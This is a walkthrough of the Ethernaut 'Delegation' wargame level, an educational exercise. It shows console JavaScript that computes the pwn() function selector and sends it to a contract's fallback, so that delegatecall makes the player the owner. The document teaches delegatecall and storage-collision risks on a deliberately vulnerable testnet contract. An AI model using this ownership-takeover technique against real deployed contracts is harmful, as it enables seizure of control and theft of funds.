# Delegation – Level 6 Walkthrough

Welcome to the **Delegation** level of the [Ethernaut](https://ethernaut.openzeppelin.com/) wargame by OpenZeppelin, focused on exploiting `delegatecall` misuse and understanding storage collision vulnerabilities in smart contracts.

---

## Challenge Objective

You are given a contract with a fallback function that uses `delegatecall` to another contract. Your goal is to:

- Become the owner of the main contract
- Submit the instance to complete the level

---

## Prerequisites

Before you begin, ensure the following:

- **MetaMask** is installed and connected
- **Test ETH** is available (Goerli, Sepolia, etc.)
- Familiarity with using **browser DevTools** and executing JavaScript commands
- Access to the [Ethernaut Game](https://ethernaut.openzeppelin.com/)

---

## Getting Started

### 1. **Load the Level**

- Navigate to [ethernaut.openzeppelin.com](https://ethernaut.openzeppelin.com/)
- Select **"Delegation"** from the list of levels
- Click **"Get new instance"**
- Approve the MetaMask transaction to deploy your personalized challenge contract

Once the contract is deployed, it will inject a global object called `contract` into your browser console.

---

## Walkthrough – Step by Step

### 🗒️ Step 1: Get the Function Selector for `pwn()`

```js
web3.utils.keccak256("pwn()").slice(0,10)
```
> This returns the function selector for `pwn()`, which is `"0xdd365b8b"`.

---

### 🛠️ Step 2: Call the Fallback Function with the Selector

```js
await web3.eth.sendTransaction({
    from: player,
    to: contract.address,
    data: "0xdd365b8b"
});
```
> This triggers the fallback in `Delegation`, which uses `delegatecall` to execute `pwn()` in the context of `Delegation`, making you the owner.

---

### 🔍 Step 3: Verify Ownership

```js
await contract.owner()
```
> This should return your wallet address, confirming you are now the owner.

---

### ✅ Step 4: Submit the Level

Click **“Submit instance”** in the UI and confirm the MetaMask transaction. Once successful, the level is marked as **completed**.

---

## 💡 What You Learn

- How `delegatecall` works in Solidity
- The risks of forwarding calldata with `delegatecall`
- How storage layout affects contract security
- Why fallback functions can be dangerous with `delegatecall`

---

## Concepts Covered

| Concept           | Description                                                                     |
| ----------------- | ------------------------------------------------------------------------------- |
| `delegatecall`    | Executes code from another contract in the context of the calling contract      |
| Fallback function | Handles calls to undefined functions; risky with delegatecall                   |
| Function selector | First 4 bytes of the Keccak-256 hash of the function signature                  |
| Storage collision | Delegatecall modifies the storage of the calling contract, not the callee       |

---

## Resources

- [Ethernaut Game](https://ethernaut.openzeppelin.com/)
- [Solidity Docs – delegatecall](https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html#delegatecall-callcode-and-libraries)
- [Blog: How to Hack Solidity Contracts with delegatecall](https://shubhamm.me/blog/ethernaut_challenges_delegation)

---
